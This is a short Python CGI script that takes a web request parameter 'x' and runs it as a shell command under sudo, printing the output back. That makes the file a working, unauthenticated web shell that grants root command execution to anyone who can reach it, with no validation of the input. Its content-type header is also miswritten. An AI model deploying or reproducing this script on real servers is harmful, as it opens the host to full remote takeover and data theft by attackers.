#!/usr/bin/python3
print("content.type:text/html")
print()

import subprocess
import cgi
recieve = cgi.FieldStorage()
command = recieve.getvalue("x")
output = subprocess.getoutput("sudo " + command)
print(output)
